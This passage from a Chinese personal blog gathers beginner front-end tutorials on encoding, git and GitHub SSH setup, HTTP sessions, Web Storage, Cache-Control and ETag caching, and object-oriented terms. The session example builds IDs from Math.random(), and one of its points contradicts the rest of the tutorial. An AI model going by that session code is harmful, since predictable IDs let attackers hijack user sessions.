<li>d — 目录、r — 可读、w — 可写、x — 可执行<br>rwx（管理员权限）<br>r-x（用户所在组权限）<br>r-x（任意用户权限）<pre><code>![更多信息](http://upload-images.jianshu.io/upload_images/9617841-96efb0bf3fef1021.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
</code></pre></li>
</ul>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/前端基础/">前端基础</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-18T23:37:54.000Z"><a href="/2018/02/19/前端基础系列（一） -- 编程基础/">2018-02-19</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/19/前端基础系列（一） -- 编程基础/">前端基础系列（一） -- 编程基础</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><strong>操作系统</strong>运行于<strong>硬件</strong>之上，<strong>浏览器</strong>运行于<strong>操作系统</strong>之上，<strong>HTML | CSS | JavaScript</strong>运行于<strong>浏览器</strong>之上，HTML | CSS | JavaScript 的所有<strong>数据</strong>都来自于服务器</p>
<h1 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h1><h3 id="如何存储0和1"><a href="#如何存储0和1" class="headerlink" title="如何存储0和1"></a>如何存储0和1</h3><p>1 — 充电<br>0 — 不充电<br>充完电之后立刻放电<br>cpu — 表示每秒钟可以充多少次电</p>
<h3 id="如何储存数字"><a href="#如何储存数字" class="headerlink" title="如何储存数字"></a>如何储存数字</h3><p><strong>十进制 — 十六进制</strong></p>
<p>0—0    1—1    2—2    3—3    4—4    5—5    6—6    7—7    8—8</p>
<p>9—9    10—A    11—B    12—C    13—D    14—E    15—F</p>
<p><strong>二进制 — 十六进制（4位，不足位数补0）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0000---0    0001---1    0010---2    0011---3    0100---4    </span><br><span class="line"></span><br><span class="line">0101---5    0110---6    0111---7    1000---8    1001---9    </span><br><span class="line"></span><br><span class="line">1010---A   1011---B    1100---C    1101---D    1110---E    1111-F</span><br></pre></td></tr></table></figure></p>
<h3 id="如何存储字符（二进制）"><a href="#如何存储字符（二进制）" class="headerlink" title="如何存储字符（二进制）"></a>如何存储字符（二进制）</h3><p>ASCII</p>
<h3 id="如何存储中文-十六进制"><a href="#如何存储中文-十六进制" class="headerlink" title="如何存储中文(十六进制)"></a>如何存储中文(十六进制)</h3><p>GB2312 ==&gt; GBK </p>
<h3 id="如何存储所有字符（32位）"><a href="#如何存储所有字符（32位）" class="headerlink" title="如何存储所有字符（32位）"></a>如何存储所有字符（32位）</h3><p>Unicode字符集 ==&gt; UTF-8（是一种编码方式，不是字符集，减少内存使用）<br><img src="http://upload-images.jianshu.io/upload_images/9617841-668635fe2645fe2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-6edf22ac8e6ca336.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h1 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h1><p>javascript使用了Unicode字符集，但是没有使用UTF-8编码（ES6解决了）。ES5只能表示两个字节以内的字符</p>
<h1 id="GitHub-的使用"><a href="#GitHub-的使用" class="headerlink" title="GitHub 的使用"></a>GitHub 的使用</h1><h3 id="新建库"><a href="#新建库" class="headerlink" title="新建库"></a>新建库</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-8deb8a7ddcda4ef3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="库的名字"><a href="#库的名字" class="headerlink" title="库的名字"></a>库的名字</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-ae36665ad523fb02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-12f6b7c2c15c713b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<ul>
<li>在本地新建一个文件夹，之后用 git bash 打开，在 git bash 中输入<br><img src="http://upload-images.jianshu.io/upload_images/9617841-a3d89a0edd565a46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></li>
</ul>
<p>代表成功。此处若出现问题，则需要配置git<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &apos;your username&apos; </span><br><span class="line">git config --global user.email &apos;your email&apos;</span><br><span class="line">git config --global push.default simple </span><br><span class="line">git config --global core.quotepath false </span><br><span class="line">git config --global core.editor &quot;vim&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-3017859e723e5ab2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="若-git-push-u-origin-master出现错误，则需要进行下面的配置，点击-settings"><a href="#若-git-push-u-origin-master出现错误，则需要进行下面的配置，点击-settings" class="headerlink" title="若 git push -u origin master出现错误，则需要进行下面的配置，点击 settings"></a>若 <code>git push -u origin master</code>出现错误，则需要进行下面的配置，点击 <code>settings</code></h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-362acb3e91510047.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="点击-SSH-and-GPG-keys"><a href="#点击-SSH-and-GPG-keys" class="headerlink" title="点击  SSH and GPG keys"></a>点击  <code>SSH and GPG keys</code></h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-96e958352b0fd829.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-fdabe695803b8cc9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-92781ddcb31041a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><strong>注意添加自己的邮箱，回车。</strong></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-45f8b29e96ea12bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="将生成的文件打印"><a href="#将生成的文件打印" class="headerlink" title="将生成的文件打印"></a>将生成的文件打印</h3><p>在 git bash 中输入 <code>cat ~/.ssh/id_rsa.pub</code> 将输出的东西复制</p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-0d0209c20a027a6d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="title-随意填写，将刚刚复制的粘贴到-Key-中"><a href="#title-随意填写，将刚刚复制的粘贴到-Key-中" class="headerlink" title="title 随意填写，将刚刚复制的粘贴到 Key 中"></a>title 随意填写，将刚刚复制的粘贴到 <code>Key</code> 中</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-06da618856a7d9ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="之后再一次在-git-bash-中输入git-push-u-origin-master-即可，出现下面的即表示成功。"><a href="#之后再一次在-git-bash-中输入git-push-u-origin-master-即可，出现下面的即表示成功。" class="headerlink" title="之后再一次在 git bash 中输入git push -u origin master 即可，出现下面的即表示成功。"></a>之后再一次在 git bash 中输入<code>git push -u origin master</code> 即可，出现下面的即表示成功。</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-768c35ff60764678.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-1be5010b6ee210a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-9a82d100b485c46e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="之后运用-vs-Code-编辑在本地创建的文件夹"><a href="#之后运用-vs-Code-编辑在本地创建的文件夹" class="headerlink" title="之后运用 vs Code 编辑在本地创建的文件夹"></a>之后运用 vs Code 编辑在本地创建的文件夹</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-d5f34e0530589b87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<ul>
<li>进行提交<br><img src="http://upload-images.jianshu.io/upload_images/9617841-b25c7fae9b69d1c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"><br><img src="http://upload-images.jianshu.io/upload_images/9617841-534685159088a058.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></li>
</ul>
<h3 id="点击-推送，之后刷新-github-页面，即可看到更新"><a href="#点击-推送，之后刷新-github-页面，即可看到更新" class="headerlink" title="点击 推送，之后刷新 github 页面，即可看到更新"></a>点击 <code>推送</code>，之后刷新 github 页面，即可看到更新</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-a3a9e4422b103879.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-528cc4d48bc6a620.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="之后填写内容，提交推送，刷新-github"><a href="#之后填写内容，提交推送，刷新-github" class="headerlink" title="之后填写内容，提交推送，刷新 github"></a>之后填写内容，提交推送，刷新 github</h3><h3 id="在-github-上查看HTML文件"><a href="#在-github-上查看HTML文件" class="headerlink" title="在 github 上查看HTML文件"></a>在 github 上查看HTML文件</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-5cc389c5db29614b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-4053f515854eb58f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-c12e5d26330d3a2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<h3 id="先在浏览器中粘贴地址，并加上文件名，之后复制地址"><a href="#先在浏览器中粘贴地址，并加上文件名，之后复制地址" class="headerlink" title="先在浏览器中粘贴地址，并加上文件名，之后复制地址!"></a>先在浏览器中粘贴地址，并加上文件名，之后复制地址!</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-899dbd492369dc42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-88fa798f1f640992.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片"></p>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/前端基础/">前端基础</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-10T00:28:18.000Z"><a href="/2018/02/10/HTTP系列 -- Session + Storage + Cache-Control + ETag + Cookie/">2018-02-10</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/10/HTTP系列 -- Session + Storage + Cache-Control + ETag + Cookie/">HTTP系列 -- Session + Storage + Cache-Control + ETag + Cookie</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>本文主要讲述 Session + Storage + Cache-Control + ETag + Cookie 这五者的作用及区别</p>
<h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>首先通过代码认识一下 Session。之前我们说 Cookie 可以存储我们的一些信息，但是由于用户在浏览器中可以对 Cookie 进行操作，显然这不是我们想要的，所以 Session 应运而生，Session <strong>解决了 Cookie 不安全的痛点</strong></p>
<h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>我们在内存中开辟一个空间，用来存储 Session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let sessions = &#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p>当用户登录成功时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let sessionId = Math.random() * 1000000</span><br><span class="line">sessions[ sessionId ] = &#123; key: value &#125;  // 表示存储的用户信息</span><br><span class="line">response.setHeader( &apos;Set-Cookie&apos;, `sessionId = $&#123; sessionId &#125;` )  // Cookie: &apos;sessionId = 随机数&apos;</span><br></pre></td></tr></table></figure></p>
<p>当此用户访问首页时，遍历 Cookie，将所有 Cookie 存储到一个 hash（哈希表）中，之后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let mySession = sessions[ hash.sessionId ]</span><br><span class="line">let username</span><br><span class="line">if( mySession )&#123;</span><br><span class="line">    username = mySession.用户信息  // 用户信息表示 sessions 中的&#123; key: value &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h6 id="Session-特点"><a href="#Session-特点" class="headerlink" title="Session 特点"></a>Session 特点</h6><ol>
<li>服务器通过 Cookie（<code>sessionId = ${ sessionId }</code>） 将 SessionId（随机数）发给浏览器</li>
<li>服务器有一块内存保存了所有的 Session（哈希表）</li>
<li>当浏览器访问服务器时，服务器读取 SessionId</li>
<li>服务器通过 SessionId 可以得到对应用户的隐私信息</li>
<li>用户每次登录都会设置一个 SessionId，并且 SessionId 不保存在服务器中</li>
</ol>
<h1 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h1><p>作为 Web Storage API 的接口（HTML5），Storage 提供了访问特定域名下的会话存储（session storage）和本地存储（local storage）的功能，例如：增删改查存储的数据项。Storage 与 HTTP 无关，它是浏览器上的哈希表，Storage 文件存储在本地的一个文件夹中</p>
<ul>
<li><code>window.sessionStorage</code> ==&gt; 操作<strong>一个域名</strong>的会话存储（session storage）</li>
<li><code>window.localStorage</code> ==&gt; 操作<strong>一个域名</strong>的本地存储（local storage）<h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4></li>
<li><p><code>Storage.setItem()</code> ==&gt; 接收一个键名和值作为参数，把键值对添加到存储中，如果键名存在，则更新其对应的值 </p>
</li>
<li><p><code>Storage.getItem()</code> ==&gt; 接收一个键名作为参数，返回键名对应的值</p>
</li>
<li><p><code>Storage.removeItem()</code> ==&gt; 接收一个键名作为参数，并把该键名从存储中删除</p>
</li>
<li><p><code>Storage.clear()</code> ==&gt; 清空存储中的所有键名</p>
</li>
</ul>
<h6 id="对象的存储"><a href="#对象的存储" class="headerlink" title="对象的存储"></a>对象的存储</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localStorage.setItem( &apos;object&apos;, &#123; name: &apos;obj&apos; &#125; )  // object  [ object Object ]</span><br></pre></td></tr></table></figure>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-4215d1335bb982ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="存储对象"><br>浏览器会将 <code>{ name: &#39;obj&#39; }</code> 转化为字符串即 <code>({ name: &#39;obj&#39; }).toString</code>，所以当我们存储对象时，使用 JSON ，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localStorage.setItem( &apos;object&apos;, JSON.stringify(&#123; name: &apos;obj&apos; &#125;))</span><br></pre></td></tr></table></figure></p>
<h4 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h4><h6 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h6><p>记录是否提示过用户 + 记录一些不敏感的信息，常见新手引导界面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let already = localStorage.getItem( &apos;isGuide&apos; )</span><br><span class="line">if( !already )&#123;</span><br><span class="line">    // 开启引导</span><br><span class="line">    localStorage.setItem( &apos;isGuide&apos;, true )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h6 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h6><ol>
<li>localStorage 与 HTTP 无关，所以 HTTP 不会带上 localStorage 的值</li>
<li>每个域名的 localStorage 有最大存储量，因浏览器而异</li>
<li>只有相同域名的页面才能互相读取 localStorage</li>
<li><strong>localStorage 永久有效，除非用户清除</strong></li>
</ol>
<h4 id="sessionStorage"><a href="#sessionStorage" class="headerlink" title="sessionStorage"></a>sessionStorage</h4><h6 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h6><ol>
<li>sessionStorage 与 HTTP 无关，所以 HTTP 不会带上 sessionStorage 的值</li>
<li>每个域名的 sessionStorage 有最大存储量，因浏览器而异</li>
<li>SessionStorage 只在同一浏览器窗口中共享</li>
<li><strong>sessionStorage 在用户关闭页面后就会失效</strong></li>
</ol>
<h1 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h1><p>Cache-Control 通用消息头被用于在 HTTP 请求和响应中通过指定指令来实现缓存机制。当我们请求的文件（css、js）很大时，可以使用 Cache-Control 实现缓存，从而达到性能优化的目的<br><strong>前提：使用相同的 URL 才能实现 Cache-Control 缓存机制</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTML</span><br><span class="line">&lt;link rel = &quot;stylesheet&quot; href = &quot;URL&quot;&gt;</span><br><span class="line">&lt;script src = &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="后端-code"><a href="#后端-code" class="headerlink" title="后端 + code"></a>后端 + code</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/js/main.js&apos; )&#123;</span><br><span class="line">    response.setHeader( &apos;Cache-Control&apos;, &apos;max-age = 30&apos; )  </span><br><span class="line">    // 30s 内如果请求 main.js 文件，浏览器不发送请求，直接使用缓存中文件 ==&gt; 下载时间 === 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h4><ol>
<li>让浏览器在一段时间内不访问服务器，不发送请求，直接使用本地硬盘 | 内存作为响应，从而减少请求时间</li>
<li>首页（入口文件 + HTML）不设置 Cache-Control，因为在缓存的这段时间内，用户不能获取最新网页</li>
<li>其他文件（css + js）会缓存很久（10年，甚至更久），如要更新，只需要改变入口文件（HTML）的 URL 即可，之后浏览器就会缓存最新版的文件</li>
<li>URL 改变实现方式：+ 查询参数 | + 随机数<br><img src="http://upload-images.jianshu.io/upload_images/9617841-69a7972df596f14d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="URL 改变实现 + 随机数"></li>
</ol>
<h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4><p>Expires 头指定了一个日期 | 时间， 在这个日期 | 时间之后，HTTP响应被认为是过时的</p>
<h4 id="Cache-Control-Expires"><a href="#Cache-Control-Expires" class="headerlink" title="Cache-Control | Expires"></a>Cache-Control | Expires</h4><p>从 Expires ==&gt; Cache-Control 是 HTTP 升级的过程，以前使用 Expires 加缓存，现在使用 Cache-Control 加缓存，Expires 的问题在于，它的过期时间是本地的时间，如果本地时间错乱，可能导致用户一直不能使用缓存，从而影响用户体验<br>两者的区别在于：Cache-Control 设置缓存时长，Expires 设置缓存过期时间点。如果两者同时设置，Cache-Control 优先使用</p>
<h1 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h1><p>ETag HTTP 响应头是资源的特定版本的标识符。可以让缓存更加高效并节省宽带，如果内容没有改变，Web 服务器不需要发送完整的响应</p>
<h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>MD5 指摘要算法，它可以把一个文件转化成一个字符串。若文件内容相同，则字符串相同。文件内容差异越小，字符串（算出来的结果）差异越大</p>
<h4 id="后端-code-1"><a href="#后端-code-1" class="headerlink" title="后端 + code"></a>后端 + code</h4><p>安装 MD5 <code>npm install md5</code>，然后 node.js 使用 MD5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">else if( path === &apos;/js/main.js&apos; )&#123;</span><br><span class="line">    let string = fs.readFileSync( &apos;./js/main.js&apos;, &apos;utf-8&apos; )</span><br><span class="line">    let fileMd5 = md5( string )</span><br><span class="line">    response.setHeader( &apos;ETag&apos;, fileMd5 )  // 响应头中有 ETag ==&gt; ETag: md5 值</span><br><span class="line">    // 当设置了 ETag 响应头，下次刷新时，请求中会多一个 If-None-Match 的请求头，值为 ETag 的值（md5 值）</span><br><span class="line">    if( request.header[ &apos;if-none-match&apos; ] === fileMd5 )&#123;  // 如果请求的版本号（md5 值） === 浏览器的 If-None-Match 的值（md5 值） ==&gt; 相同版本不需要下载</span><br><span class="line">        // 没有响应体</span><br><span class="line">        response.statusCode = 304  </span><br><span class="line">        // 304 Not Modified 表示资源未被修改，因为请求头指定的版本If-Modified-Since或If-None-Match。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        response.statusCode = 200</span><br><span class="line">        // 有响应体</span><br><span class="line">        response.write( string )</span><br><span class="line">    &#125;</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="缓存机制"><a href="#缓存机制" class="headerlink" title="缓存机制"></a>缓存机制</h1><p>Cache-Control + ETag 联合使用</p>
<h1 id="辨析"><a href="#辨析" class="headerlink" title="辨析"></a>辨析</h1><h3 id="Cookie-Session"><a href="#Cookie-Session" class="headerlink" title="Cookie + Session"></a>Cookie + Session</h3><ol>
<li>Cookie 指某些服务器在浏览器终端的一些数据（通常经过加密），一般为了辨别用户身份，也可以储存少量信息</li>
<li>Session 是指服务器通过某种方式确定了用户身份后的会话状态，一般表现为服务器为每个用户单独存储的一部分数据</li>
<li>Session 是基于 Cookie 实现的，Cookie 是 Session 的基石</li>
<li>Cookie 存储在浏览器本地，用户可以看到内容。Session 存储在服务器，用户无法查看内容，一般 Session 的内容是进程\线程间共享的</li>
<li>Cookie 不安全，而 Session 解决了 Cookie 不安全的痛点</li>
</ol>
<h3 id="Cookie-Storage"><a href="#Cookie-Storage" class="headerlink" title="Cookie + Storage"></a>Cookie + Storage</h3><ol>
<li>Cookie 和 Storage 都存储在本地的一个文件中</li>
<li>两者都可以做跨页面通信，两者都不能跨域访问</li>
<li>Cookie 的每次请求<strong>相同域名</strong>时，都会带上 Cookie 里的所有内容去访问服务器</li>
<li>Storage 与 HTTP 无关，不会被带给服务器</li>
<li>Cookie 在做跨页面通信时，由于带上所有内容，导致上传数据 + 请求变慢，Storage 的出现解决了 Cookie 的痛点，只要将一些不敏感信息存储在 Storage 中即可</li>
<li>JS 调用 Cookie 比较麻烦，一般都用库进行封装。Storage 调用起来比较简单，也可以再次封装达到更好的效果</li>
<li>Cookie 大小 4K 左右，Storage 大小 5M 左右</li>
<li>后台代码可以任意设置 Cookie 的过期时间。Storage 中的 LocalStorage 永久有效，除非用户删除，Storage 中的 SessionStorage 在用户关闭页面（Session 结束）后就失效</li>
</ol>
<h3 id="LocalStorage-SessionStorage"><a href="#LocalStorage-SessionStorage" class="headerlink" title="LocalStorage + SessionStorage"></a>LocalStorage + SessionStorage</h3><ol>
<li>两者与 HTTP 无关</li>
<li>每个域名的 LocalStorage | sessionStorage 有最大存储量，因浏览器而异</li>
<li>只有相同域名的页面才能互相读取 LocalStorage。SessionStorage 只在同一浏览器窗口中共享</li>
<li>LocalStorage 本地存储， SessionStorage 会话存储</li>
<li>LocalStorage 永久有效，除非用户删除。SessionStorage 在用户关闭页面（Session 结束）后就失效</li>
</ol>
<h3 id="Cache-Control-ETag"><a href="#Cache-Control-ETag" class="headerlink" title="Cache-Control + ETag"></a>Cache-Control + ETag</h3><ol>
<li>两者都是 HTTP 响应头，都可以实现加快请求 | 响应速度</li>
<li>Cache-Control 是直接使用本地缓存，<strong>不会发送请求</strong></li>
<li>ETag <strong>发送请求</strong>，如果 MD5 值相同，则没有响应体</li>
</ol>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/HTTP/">HTTP</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-07T23:35:39.000Z"><a href="/2018/02/08/JS进阶 -- 面向对象（Object-Oriented）/">2018-02-08</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/08/JS进阶 -- 面向对象（Object-Oriented）/">JS进阶 -- 面向对象（Object-Oriented）</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>面向对象是一种前端前辈们总结出的一套经验，因为它是一种经验，所以每个前端都对其有自己的理解，但毫不保留的说它可以使我们更快、更好的进行开发。它的中心思想可以理解为 <strong>你办事，我放心</strong></p>
<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>面向对象</strong>是把一组数据结构和处理它们的方法组成<strong>对象（Object）</strong>，把相同行为的对象归纳为<strong>类（Class）</strong>，通过类的<strong>封装（Encapsulation）</strong>隐藏内部细节，通过<strong>继承（Inheritance）</strong>实现类的<strong>特化（Specialization）</strong>/<strong>泛化（Generalization）</strong>，通过<strong>多态（Polymorphism）</strong>实现基于对象类型的<strong>动态分派（Dunamic Dispatch）</strong></p>
<h6 id="注意：现在看不懂没有关系，先往下看。"><a href="#注意：现在看不懂没有关系，先往下看。" class="headerlink" title="注意：现在看不懂没有关系，先往下看。"></a>注意：现在看不懂没有关系，先往下看。</h6><h1 id="技术术语"><a href="#技术术语" class="headerlink" title="技术术语"></a>技术术语</h1><h3 id="Namespace-命名空间"><a href="#Namespace-命名空间" class="headerlink" title="Namespace 命名空间"></a>Namespace 命名空间</h3><p>它是一种可以捆绑功能的容器，经常是一个对象，可以为这个对象添加属性和方法，这个对象就是命名空间，例如 window.jQuery</p>
<h3 id="Class-类"><a href="#Class-类" class="headerlink" title="Class 类"></a>Class 类</h3><p>定义对象的特征，它是对象属性和方法的模板定义</p>
<h3 id="Object-对象"><a href="#Object-对象" class="headerlink" title="Object 对象"></a>Object 对象</h3><p>类的一个实例</p>
<h3 id="Property-属性"><a href="#Property-属性" class="headerlink" title="Property 属性"></a>Property 属性</h3><p>对象的特征，比如大小</p>
<h3 id="Method-方法"><a href="#Method-方法" class="headerlink" title="Method 方法"></a>Method 方法</h3><p>对象的能力，比如行走</p>
<h3 id="Constructor-构造函数"><a href="#Constructor-构造函数" class="headerlink" title="Constructor 构造函数"></a>Constructor 构造函数</h3><p>对象初始化的瞬间，被调用的方法，通常它的名字和包含它的类一致</p>
<h3 id="Inheritance-继承"><a href="#Inheritance-继承" class="headerlink" title="Inheritance 继承"></a>Inheritance 继承</h3><p>一个类可以继承另一个类的特征</p>
<h3 id="Encapsulation-封装"><a href="#Encapsulation-封装" class="headerlink" title="Encapsulation 封装"></a>Encapsulation 封装</h3><p>把数据和相关的方法绑定在一起使用的方法</p>
<h3 id="Abstraction-抽象"><a href="#Abstraction-抽象" class="headerlink" title="Abstraction 抽象"></a>Abstraction 抽象</h3><p>结合复杂的继承、方法和属性的对象可以模拟现实的模型</p>
<h3 id="Polymorphism-多态"><a href="#Polymorphism-多态" class="headerlink" title="Polymorphism 多态"></a>Polymorphism 多态</h3><p>不同的类可以定义为相同的方法或属性</p>
